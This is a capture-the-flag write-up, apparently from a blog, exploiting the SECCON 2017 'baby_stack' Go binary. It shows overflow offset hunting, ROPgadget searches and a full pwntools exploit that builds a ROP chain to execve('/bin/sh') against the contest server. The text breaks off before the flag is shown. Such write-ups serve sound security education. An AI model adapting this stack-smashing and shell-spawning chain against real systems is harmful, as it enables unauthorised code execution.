<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">checksec</div><div class="line">CANARY    : disabled</div><div class="line">FORTIFY   : disabled</div><div class="line">NX        : ENABLED</div><div class="line">PIE       : disabled</div><div class="line">RELRO     : disabled</div></pre></td></tr></table></figure>
<p>We don’t have a stack canary to stop us so the first thing to do is to run the binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </div><div class="line">Please tell me your name &gt;&gt; A</div><div class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa</div><div class="line">unexpected fault address 0x0</div><div class="line">fatal error: fault</div><div class="line">[signal 0xb code=0x80 addr=0x0 pc=0x456551]</div><div class="line"></div><div class="line">goroutine 1 [running]:</div><div class="line">runtime.throw(0x507550, 0x5)</div><div class="line">	/usr/lib/go-1.6/src/runtime/panic.go:547 +0x90 fp=0xc82003f5b8 sp=0xc82003f5a0</div><div class="line">runtime.sigpanic()</div><div class="line">	/usr/lib/go-1.6/src/runtime/sigpanic_unix.go:27 +0x2ab fp=0xc82003f608 sp=0xc82003f5b8</div><div class="line">runtime.memmove(0xc82008a00b, 0x4141414141414141, 0x61414141)</div><div class="line">	/usr/lib/go-1.6/src/runtime/memmove_amd64.s:83 +0x91 fp=0xc82003f610 sp=0xc82003f608</div><div class="line">fmt.(*fmt).padString(0xc82006ebb8, 0x4141414141414141, 0x61414141)</div><div class="line">	/usr/lib/go-1.6/src/fmt/format.go:130 +0x456 fp=0xc82003f730 sp=0xc82003f610</div><div class="line">fmt.(*fmt).fmt_s(0xc82006ebb8, 0x4141414141414141, 0x61414141)</div><div class="line">	/usr/lib/go-1.6/src/fmt/format.go:322 +0x61 fp=0xc82003f760 sp=0xc82003f730</div><div class="line">fmt.(*pp).fmtString(0xc82006eb60, 0x4141414141414141, 0x61414141, 0xc800000073)</div><div class="line">	/usr/lib/go-1.6/src/fmt/print.go:521 +0xdc fp=0xc82003f790 sp=0xc82003f760</div><div class="line">fmt.(*pp).printArg(0xc82006eb60, 0x4c1c00, 0xc82000a380, 0x73, 0x0, 0x0)</div><div class="line">	/usr/lib/go-1.6/src/fmt/print.go:797 +0xd95 fp=0xc82003f918 sp=0xc82003f790</div><div class="line">fmt.(*pp).doPrintf(0xc82006eb60, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2)</div><div class="line">	/usr/lib/go-1.6/src/fmt/print.go:1238 +0x1dcd fp=0xc82003fca0 sp=0xc82003f918</div><div class="line">fmt.Fprintf(0x7fcd857d21e8, 0xc82002c010, 0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x40beee, 0x0, 0x0)</div><div class="line">	/usr/lib/go-1.6/src/fmt/print.go:188 +0x74 fp=0xc82003fce8 sp=0xc82003fca0</div><div class="line">fmt.Printf(0x5220a0, 0x18, 0xc82003fea8, 0x2, 0x2, 0x20, 0x0, 0x0)</div><div class="line">	/usr/lib/go-1.6/src/fmt/print.go:197 +0x94 fp=0xc82003fd50 sp=0xc82003fce8</div><div class="line">main.main()</div><div class="line">	/home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go:23 +0x45e fp=0xc82003ff50 sp=0xc82003fd50</div><div class="line">runtime.main()</div><div class="line">	/usr/lib/go-1.6/src/runtime/proc.go:188 +0x2b0 fp=0xc82003ffa0 sp=0xc82003ff50</div><div class="line">runtime.goexit()</div><div class="line">	/usr/lib/go-1.6/src/runtime/asm_amd64.s:1998 +0x1 fp=0xc82003ffa8 sp=0xc82003ffa0</div></pre></td></tr></table></figure>
<p>We did overflow the buffer but what really happened here? If you look at the stack traces we <strong>aren’t</strong> really getting a <strong>segmentation fault</strong> because we are replacing the ret address, the exception is occurring because we are changing the parameters of <strong><code>fmt.Printf</code></strong>, the binary isn’t reaching the <strong><code>ret</code></strong> instruction because of this, we need to set some <strong>break points</strong> before this prints to put the correct addresses on them, something that doesn’t crash the program.</p>
<p>To check good breakpoint addresses I used IDA, radare2 was way too slow and didn’t gave me nice results on it, after opening it in IDA I searched for a function named <strong><code>main_main</code></strong> and tryed to find a function <strong><code>bufio___Scanner__Scan</code></strong> which in go is a function that reads inputs from the <strong><code>STDIN</code></strong>.<br><a data-fancybox="gallery" href="https://i.imgur.com/0kyUAPc.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/0kyUAPc.png" alt=""><br></a><br>Checking it on another view to check its addresses:<br><a data-fancybox="gallery" href="https://i.imgur.com/HEuxv0i.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/HEuxv0i.png" alt=""><br></a></p>
<p>After setting some breakpoints in the <strong>printf’s</strong> after those 2 scans, I realised that the padding needed to reach the 1st parameter was <strong>104</strong> so we can start testing it in the binary:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ python -c <span class="string">"print 'A'*104 + 'BBBBBBBB'"</span></div><div class="line">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</div><div class="line">$ ./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </div><div class="line">Please tell me your name &gt;&gt; A</div><div class="line">Give me your message &gt;&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB</div><div class="line">...</div><div class="line">runtime.memmove(0xc82000e30b, 0x4242424242424242, 0x1)</div><div class="line">...</div></pre></td></tr></table></figure>
<p>There it is, we are replacing the address of the string that <strong><code>printf</code></strong> wants to print, we can’t continue overflowing the rest to reach the <strong><code>ret</code></strong> instruction, to get this valid address I just picked a value that I got from gdb from the stack:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line">gdb-peda$ b *0x4011D2</div><div class="line">Note: breakpoint 1 also set at pc 0x4011d2.</div><div class="line">Breakpoint 2 at 0x4011d2: file /home/yutaro/CTF/SECCON/2017/baby_stack/baby_stack.go, line 18.</div><div class="line">gdb-peda$ r</div><div class="line">Starting program: /baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 </div><div class="line">[New LWP 8293]</div><div class="line">[New LWP 8294]</div><div class="line">[New LWP 8295]</div><div class="line">Please tell me your name &gt;&gt; A</div><div class="line"></div><div class="line">[----------------------------------registers-----------------------------------]</div><div class="line">RAX: 0x1 </div><div class="line">RBX: 0x0 </div><div class="line">RCX: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)</div><div class="line">RDX: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</div><div class="line">RSI: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</div><div class="line">RDI: 0xc82000a2c1 --&gt; 0x41 (&apos;A&apos;)</div><div class="line">RBP: 0x0 </div><div class="line">RSP: 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)</div><div class="line">RIP: 0x4011d2 (&lt;main.main+466&gt;:	call   0x45ac40 &lt;fmt.Printf&gt;)</div><div class="line">R8 : 0x1 </div><div class="line">R9 : 0x1000 </div><div class="line">R10: 0xc820074000 --&gt; 0xa41 (&apos;A\n&apos;)</div><div class="line">R11: 0x202 </div><div class="line">R12: 0x15 </div><div class="line">R13: 0x536a54 --&gt; 0x201fe001001e4 </div><div class="line">R14: 0x1 </div><div class="line">R15: 0x8</div><div class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</div><div class="line">[-------------------------------------code-------------------------------------]</div><div class="line">   0x4011c3 &lt;main.main+451&gt;:	mov    QWORD PTR [rsp+0x10],rbx</div><div class="line">   0x4011c8 &lt;main.main+456&gt;:	mov    QWORD PTR [rsp+0x18],rbx</div><div class="line">   0x4011cd &lt;main.main+461&gt;:	mov    QWORD PTR [rsp+0x20],rbx</div><div class="line">=&gt; 0x4011d2 &lt;main.main+466&gt;:	call   0x45ac40 &lt;fmt.Printf&gt;</div><div class="line">   0x4011d7 &lt;main.main+471&gt;:	mov    rbx,QWORD PTR [rsp+0x80]</div><div class="line">   0x4011df &lt;main.main+479&gt;:	mov    QWORD PTR [rsp],rbx</div><div class="line">   0x4011e3 &lt;main.main+483&gt;:	call   0x46cbc0 &lt;bufio.(*Scanner).Scan&gt;</div><div class="line">   0x4011e8 &lt;main.main+488&gt;:	mov    rax,QWORD PTR [rsp+0x80]</div><div class="line">No argument</div><div class="line">[------------------------------------stack-------------------------------------]</div><div class="line">0000| 0xc82003fd50 --&gt; 0x521e40 (&quot;Give me your message &gt;&gt; &quot;)</div><div class="line">0008| 0xc82003fd58 --&gt; 0x18 </div><div class="line">0016| 0xc82003fd60 --&gt; 0x0 </div><div class="line">0024| 0xc82003fd68 --&gt; 0x0 </div><div class="line">0032| 0xc82003fd70 --&gt; 0x0 </div><div class="line">0040| 0xc82003fd78 --&gt; 0x1 </div><div class="line">0048| 0xc82003fd80 --&gt; 0x0 </div><div class="line">0056| 0xc82003fd88 --&gt; 0x0 </div><div class="line">[------------------------------------------------------------------------------]</div></pre></td></tr></table></figure>
<p>For example an address from the stack can be something like <strong><code>0xc82003fd58</code></strong> with this we can start writing the exploit:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + <span class="string">'AAAAAAAA'</span></div><div class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</div><div class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>)</div><div class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</div><div class="line">r.sendline(padding)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>By running it we can see we are still replacing another parameter from <strong><code>printf</code></strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">python writeup.py </div><div class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>: pid 8433</div><div class="line">[*] Switching to interactive mode</div><div class="line">panic: runtime error: growslice: <span class="built_in">cap</span> out of range</div><div class="line"></div><div class="line">goroutine 1 [running]:</div><div class="line">panic(0x4e4800, 0xc820070280)</div><div class="line">    /usr/lib/go-1.6/src/runtime/panic.go:481 +0x3e6</div><div class="line">fmt.(*fmt).padString(0xc820076ef8, 0xc82003fd58, 0x4141414141414141)</div></pre></td></tr></table></figure>
<p>In this case we are replacing the number of characters that are going to be printed by printf! for example if we set the next 8 bytes to be <strong><code>0x0000000000000002</code></strong>, <strong><code>printf</code></strong> will print 2 characters starting by the address we gave before in the previous 8 bytes (<strong><code>0xc82003fd58</code></strong>). So lets readjust our script to do this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">padding = <span class="string">'A'</span> * <span class="number">104</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</div><div class="line">process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</div><div class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>)</div><div class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</div><div class="line">r.sendline(padding)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ python writeup.py</div><div class="line"><span class="meta">... </span></div><div class="line">Thank you, \x18\x00\x00!</div><div class="line">msg : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</div><div class="line">[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</div></pre></td></tr></table></figure>
<p>As you can see we are no longer seg faulting and as I said before you can see that only 3 bytes are being printed after the string “Thank you, “ we need to calculate the offset to the next <strong><code>printf</code></strong> and do the same thing, give an address and the number of bytes to be printed, <strong>only then</strong> we can <strong>replace the return address</strong> with success! So after calculating everything our script will look like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">off_printf1 = <span class="number">104</span></div><div class="line">off_printf2 = <span class="number">80</span></div><div class="line">off_retaddress = <span class="number">192</span></div><div class="line">padding_printf1 = <span class="string">'A'</span> * off_printf1 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</div><div class="line">padding_printf2 = <span class="string">'A'</span> * off_printf2 + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x3</span>)</div><div class="line">padding_retaddresss = <span class="string">'A'</span>*off_retaddress + p64(<span class="number">0xdeadbeef</span>)</div><div class="line">padding = padding_printf1 + padding_printf2 + padding_retaddresss</div><div class="line">r = process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>)</div><div class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>)</div><div class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</div><div class="line">r.sendline(padding)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>And finally we succefully smashed the stack! and replaced the return address to <strong><code>0xdeadbeef</code></strong>:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ python writeup.py </div><div class="line">...</div><div class="line">Thank you, \x18\x00\x00!</div><div class="line">msg : X�</div><div class="line">unexpected fault address 0xdeadbeef</div><div class="line">fatal error: fault</div><div class="line">[signal 0xb code=0x1 addr=0xdeadbeef pc=0xdeadbeef]</div></pre></td></tr></table></figure></p>
<h3 id="Build-a-ropchain"><a href="#Build-a-ropchain" class="headerlink" title="Build a ropchain"></a>Build a ropchain</h3><p>Now that we replaced the return address to <strong><code>0xdeadbeef</code></strong> we can finally start by doing our ropchain, to build this ropchain we need to know a bit of assembly but first we need to know how a syscall works as assembly and which registers it uses as arguments:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">syscall(RAX, RDI, RSI, RDX)</div></pre></td></tr></table></figure>
<p>Where <strong><code>RAX</code></strong> is the system call number and <strong><code>RDI</code></strong> must have an address that points into <strong>‘/bin/sh’</strong> the rest of the registers are about the arguments! in this case we can just set them into zeros… So to build a successful ropchain we need to search some good gadgets.</p>
<h4 id="Setting-bin-sh-address-to-RDI"><a href="#Setting-bin-sh-address-to-RDI" class="headerlink" title="Setting /bin/sh address to RDI"></a>Setting /bin/sh address to RDI</h4><p>First of all we need to store /bin/sh into memory, we need a valid address to store it so we actually need to find a nice one to store our string, normally we want to use the .bss data segment, we can find it’s address in IDA:<br><a data-fancybox="gallery" href="https://i.imgur.com/VtO8xjO.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/VtO8xjO.png" alt=""><br></a></p>
<p><strong>.bss</strong> is perfect its address doesn’t change on different runs because <strong><code>PIE</code></strong> protection isn’t enabled, and as the picture above says in IDA we have <strong><code>read</code></strong> and <strong><code>write</code></strong> permissions which is what we want.</p>
<p>Now we need a special gadget for this, we need something that moves data from a register into a memory address, the ideal gadget would be <strong><code>MOV [RDI], RAX</code></strong>, with the preference that it’s a <strong>qword MOV</strong>, since <strong>/bin/sh</strong> is a quite <strong>big string</strong> we need a <strong>64bit MOV</strong> (if a 64 bit MOV weren’t available we could do it by spliting into multiple moves), so lets check with <a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="external">ROPGadgets</a>, if we have a 64bit MOV:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'mov qword ptr \[rdi\], '</span></div><div class="line">0x000000000045681b : clc ; mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</div><div class="line">0x0000000000456826 : mov eax, dword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</div><div class="line">0x0000000000456490 : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rax ; ret</div><div class="line">0x000000000045681c : mov qword ptr [rdi], rax ; mov qword ptr [rdi + rbx - 8], rcx ; ret</div><div class="line">0x0000000000456499 : mov qword ptr [rdi], rax ; ret</div><div class="line">0x0000000000456825 : mov rax, qword ptr [rsi] ; mov qword ptr [rdi], rax ; ret</div></pre></td></tr></table></figure>
<p>There we go, the <strong><code>mov qword ptr [rdi], rax ; ret</code></strong> is the gadget we need! we just need to store the .bss address into <strong><code>RDI</code></strong>, and the string <strong>/bin/sh</strong> into <code>RAX</code>, to store them into <strong><code>RDI</code></strong> and <strong><code>RAX</code></strong> we need gadgets like <strong><code>POP RDI ; RET</code></strong> and <strong><code>POP RAX ; RET</code></strong>, this gadgets will get the value on the top of the stack and store it in the respective register that’s what <strong><code>POP</code></strong> does:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rdi ;'</span></div><div class="line">0x000000000044a282 : pop rdi ; adc eax, 0x24448900 ; and byte ptr [rcx], bh ; ret</div><div class="line">0x000000000042274f : pop rdi ; add byte ptr [rax], al ; add rsp, 0x20 ; ret</div><div class="line">0x0000000000429eea : pop rdi ; call 0x401008</div><div class="line">0x0000000000470931 : pop rdi ; or byte ptr [rax + 0x39], cl ; ret</div><div class="line">$ ROPgadget --binary baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8 | grep <span class="string">'pop rax ; ret'</span></div><div class="line">0x00000000004016ea : pop rax ; ret</div><div class="line">0x0000000000429283 : pop rax ; ret 0xf66</div></pre></td></tr></table></figure>
<p>We have both gadgets but as we can see the <strong><code>pop rdi ; or byte ptr [rax + 0x39], cl ; ret</code></strong> gadget has an instruction between <strong><code>POP RDI</code></strong> and <strong><code>RET</code></strong>, We require to set <strong><code>RAX</code></strong> into a valid address before using this gadget <strong>otherwise we SEGFAULT</strong>. </p>
<p>Finally we have everything we need to store the address of /bin/sh into <code>RDI</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># setting /bin/sh into bss address</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += <span class="string">'/bin/sh\x00'</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></div></pre></td></tr></table></figure>
<h4 id="Clearing-RSI-and-RDX"><a href="#Clearing-RSI-and-RDX" class="headerlink" title="Clearing RSI and RDX"></a>Clearing RSI and RDX</h4><p>Now that we have the address of <strong>/bin/sh</strong> in <strong><code>RDI</code></strong> we need to clear the registers <strong><code>RSI</code></strong> and <strong><code>RDX</code></strong> into zero, we can do this with <strong><code>POP RET</code></strong> gadgets : </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># clear rsi and rdx registers</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x0</span>)</div><div class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x0</span>)</div></pre></td></tr></table></figure>
<p>And finally we can’t forget to set <strong><code>RAX</code></strong> into the execve system call number which is <strong><code>0x3b</code></strong>, you can get a full list of system call numbers at <a href="https://filippo.io/linux-syscall-table/" target="_blank" rel="external">https://filippo.io/linux-syscall-table/</a> , once again we can use <strong><code>POP RET</code></strong> gadget to do this:</p>
<h4 id="Setting-0x3b-into-RAX"><a href="#Setting-0x3b-into-RAX" class="headerlink" title="Setting 0x3b into RAX"></a>Setting 0x3b into RAX</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></div><div class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x3b</span>)</div><div class="line"></div><div class="line"><span class="comment"># call system call</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></div></pre></td></tr></table></figure>
<p>My final Exploit will look like this:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">return</span> process(<span class="string">'./baby_stack-7b078c99bb96de6e5efc2b3da485a9ae8a66fd702b7139baf072ec32175076d8'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'baby_stack.pwn.seccon.jp'</span>, <span class="number">15285</span>)</div><div class="line"></div><div class="line">local = <span class="keyword">False</span></div><div class="line">r = getConn()</div><div class="line"></div><div class="line">padding = <span class="string">'A'</span> * <span class="number">104</span></div><div class="line"></div><div class="line">r.recvuntil(<span class="string">'Please tell me your name &gt;&gt; '</span>)</div><div class="line">r.sendline(<span class="string">'A'</span>)</div><div class="line">r.recvuntil(<span class="string">'Give me your message &gt;&gt; '</span>)</div><div class="line"></div><div class="line">BSS = <span class="number">0x59F920</span></div><div class="line">ropchain = <span class="string">''</span></div><div class="line"></div><div class="line"><span class="comment"># setting /bin/sh into bss address</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000470931</span>) <span class="comment"># pop rdi ; or byte ptr [rax + 0x39], cl ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += <span class="string">'/bin/sh\x00'</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000456499</span>) <span class="comment"># mov qword ptr [rdi], rax ; ret</span></div><div class="line"></div><div class="line"><span class="comment"># clear rsi and rdx registers</span></div><div class="line">ropchain += p64(<span class="number">0x4016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(BSS) <span class="comment"># @.data</span></div><div class="line">ropchain += p64(<span class="number">0x00000000004a247c</span>) <span class="comment"># pop rdx ; or byte ptr [rax - 0x77], cl ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x0</span>)</div><div class="line">ropchain += p64(<span class="number">0x000000000046defd</span>) <span class="comment"># pop rsi ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x0</span>)</div><div class="line"></div><div class="line"><span class="comment"># setting rax into execve 0x3b syscall number</span></div><div class="line">ropchain += p64(<span class="number">0x00000000004016ea</span>) <span class="comment"># pop rax ; ret</span></div><div class="line">ropchain += p64(<span class="number">0x3b</span>)</div><div class="line"></div><div class="line"><span class="comment"># call system call</span></div><div class="line">ropchain += p64(<span class="number">0x0000000000456889</span>) <span class="comment"># syscall ; ret</span></div><div class="line">r.sendline(padding + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">80</span> + p64(<span class="number">0xc82003fd58</span>) + p64(<span class="number">0x00</span>) + <span class="string">'A'</span>*<span class="number">192</span> + ropchain)</div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>By running it we can get the flag:</p>
